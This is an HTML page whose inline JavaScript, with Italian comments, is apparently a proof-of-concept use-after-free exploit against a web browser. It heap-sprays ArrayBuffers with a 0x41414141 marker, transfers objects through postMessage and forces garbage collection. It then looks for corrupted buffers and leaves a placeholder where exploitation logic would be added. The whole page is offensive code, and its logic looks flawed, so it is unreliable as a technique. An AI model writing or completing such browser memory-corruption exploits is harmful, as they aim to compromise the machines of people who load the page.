<!DOCTYPE html>
<html>
<body>
<script>
let sprayBuffers = [];
let retained = { ref: null };

function triggerGC() {
  try {
    new ArrayBuffer(1024 * 1024 * 100); // Allocazione massiva per forzare il GC
  } catch(e) {
    alert("GC Triggered");
  }
}

function setupPrimitive() {
  const arr = [];
  for (let i = 0; i < 100; i++) {
    // Usa ArrayBuffer invece di Date (clonabile)
    arr.push({ 
      a: new Uint32Array([0x1337]), 
      b: new ArrayBuffer(16) // Oggetto clonabile
    });
  }
  return arr;
}

function heapSpray() {
  const marker = 0x41414141;
  for (let i = 0; i < 1000; i++) {
    const buf = new ArrayBuffer(1024);
    new Uint32Array(buf).set([marker]);
    sprayBuffers.push(buf);
  }
  retained.ref = sprayBuffers;
  alert("HEAP SPRAYED!");
}

async function main() {
  try {
    const vulnerable = setupPrimitive();
    heapSpray();

    addEventListener('message', (e) => {
      setTimeout(() => {
        triggerGC();
        const corrupted = sprayBuffers.find(buf => 
          new Uint32Array(buf)[0] !== 0x41414141
        );
        
        if (corrupted) {
          alert("UAF SUCCESSFUL!");
          // Aggiungi logica di exploitation qui
        }
      }, 100);
    }, { once: true });

    // Invia solo oggetti clonabili (ArrayBuffer)
    postMessage(vulnerable, '*', vulnerable.map(x => x.b)); 
    
  } catch(e) {
    alert("ERROR: " + e);
  }
}

setTimeout(main, 2000);
</script>
</body>
</html>
